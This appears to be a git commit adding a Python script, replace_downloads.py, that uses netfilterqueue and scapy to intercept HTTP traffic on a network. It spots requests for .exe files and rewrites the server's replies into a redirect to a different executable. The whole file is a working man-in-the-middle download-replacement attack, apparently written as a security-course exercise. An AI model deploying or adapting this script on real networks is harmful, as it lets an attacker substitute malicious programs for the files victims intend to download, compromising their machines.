64059fc518a70d818c35f308d73f73c92c8c36e2
Maryam <maryamibadulla@yahoo.com>
2022-09-06 12:15:29 -0500

    Initial commit

---
+++ replace_downloads.py
@@ -0,0 +1,34 @@
+import netfilterqueue
+import scapy.all as scapy
+
+ack_list = []
+
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80: # destination port is http (http port num =80)
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack) #add ack number to a list
+             #   print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list: #if seq is contain in ack list => this is a response to a request
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n")
+
+                packet.set_payload(str(modified_packet))
+              #print(scapy_packet.show())
+
+    packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
